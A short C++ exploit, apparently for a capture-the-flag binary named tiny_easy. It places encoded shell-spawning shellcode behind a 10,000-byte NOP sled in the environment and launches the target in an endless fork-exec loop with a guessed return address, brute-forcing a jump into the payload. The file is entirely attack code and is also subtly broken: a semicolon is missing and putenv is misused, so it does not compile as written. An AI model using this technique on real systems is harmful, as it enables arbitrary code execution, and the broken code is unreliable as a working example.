#include <unistd.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>

using namespace std;

main()
{
char address[]= "\x40\x66\x94\xff";
char revshell[]= "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
char nopsled[10000]="";
memset(nopsled, '\x90', 10000);
int status=0;
pid_t child_pid, wpid;

putenv("asd=%x%x",nopsled,revshell);
        
while (1){


        int child_pid = fork();
        if (child_pid==0) {
                execl("/home/tiny_easy/tiny_easy", address,  (char *) 0);
                }
                while ((wpid = wait(&status)) > 0);
           }
}
